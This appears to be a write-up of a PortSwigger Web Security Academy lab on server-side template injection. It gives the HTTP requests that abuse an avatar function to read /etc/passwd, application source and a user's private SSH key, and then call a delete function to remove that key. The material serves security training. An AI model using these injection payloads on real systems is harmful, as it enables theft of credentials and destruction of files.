Server-side template injection with a custom exploit

We're building upon knowledge from our previous labs. Log in and remember that the nickname functionality is vulnerable to server-side template injection.
Attempting to upload an .exe as an avatar gets us an error:

PHP Fatal error:  Uncaught Exception: Uploaded file mime type is not an image: application/x-msdownload in /home/carlos/User.php:28
Stack trace:
#0 /home/carlos/avatar_upload.php(19): User->setAvatar('/tmp/GitHubDesk...', 'application/x-m...')
#1 {main}
  thrown in /home/carlos/User.php on line 28

So setAvatar() is the function we're dealing with.
Also by the "/home/carlos/User.php" part of the error message, it seems we're uploading into carlos's home directory. 
Upload an image as avatar and change your nickname.

Looking at the request to change nickname:

POST /my-account/change-blog-post-author-display HTTP/1.1
Host: ac6a1f291e37d52e806626e200cd0059.web-security-academy.net

blog-post-author-display=user.first_name&csrf=9dj1Sh3G3aOj0OprUWOo16ftXWc4BhKV

We can observe user.first_name being called. Let's try to call setAvatar instead:

POST /my-account/change-blog-post-author-display HTTP/1.1
Host: ac6a1f291e37d52e806626e200cd0059.web-security-academy.net

blog-post-author-display=user.setAvatar('/etc/passwd')&csrf=9dj1Sh3G3aOj0OprUWOo16ftXWc4BhKV

And now make a random comment. Besides the image, we're also getting an error complaining about the MIME type. Let's adjust our payload:

POST /my-account/change-blog-post-author-display HTTP/1.1
Host: ac6a1f291e37d52e806626e200cd0059.web-security-academy.net

blog-post-author-display=user.setAvatar('/etc/passwd','image/jpg')&csrf=9dj1Sh3G3aOj0OprUWOo16ftXWc4BhKV

Refresh the page where you made your comment and hey, no more errors! But our avatar seems to have fizzled too. Let's request it manually.

GET /avatar?avatar=wiener HTTP/1.1
Host: ac6a1f291e37d52e806626e200cd0059.web-security-academy.net


Bingo, we got /etc/passwd. But that's not what we're after. Let's get carlos's script, User.php:

POST /my-account/change-blog-post-author-display HTTP/1.1
Host: ac6a1f291e37d52e806626e200cd0059.web-security-academy.net

blog-post-author-display=user.setAvatar('/home/carlos/User.php','image/jpg')&csrf=9dj1Sh3G3aOj0OprUWOo16ftXWc4BhKV


And repeat the avatar request from above. Bingo, we get to check the script. 
Looking for delete functions, we spot two but only gdprDelete() is of interest to us as it looks you can sneak in files paths:

public function gdprDelete() {
    $this->rm(readlink($this->avatarLink));
    $this->rm($this->avatarLink);
    $this->delete();
}

Now to load the .ssh keys are our avatar so that we'll be able to call the gdprDelete() function on it:

POST /my-account/change-blog-post-author-display HTTP/1.1
Host: ac6a1f291e37d52e806626e200cd0059.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0

blog-post-author-display=user.setAvatar('/home/carlos/.ssh/id_rsa','image/jpg')&csrf=9dj1Sh3G3aOj0OprUWOo16ftXWc4BhKV


And now to call the gdprDelete() function:

POST /my-account/change-blog-post-author-display HTTP/1.1
Host: ac6a1f291e37d52e806626e200cd0059.web-security-academy.net

blog-post-author-display=user.gdprDelete()&csrf=9dj1Sh3G3aOj0OprUWOo16ftXWc4BhKV

Refresh the page with your comment and you should get your lab complete prompt. Well done, you're done with the module!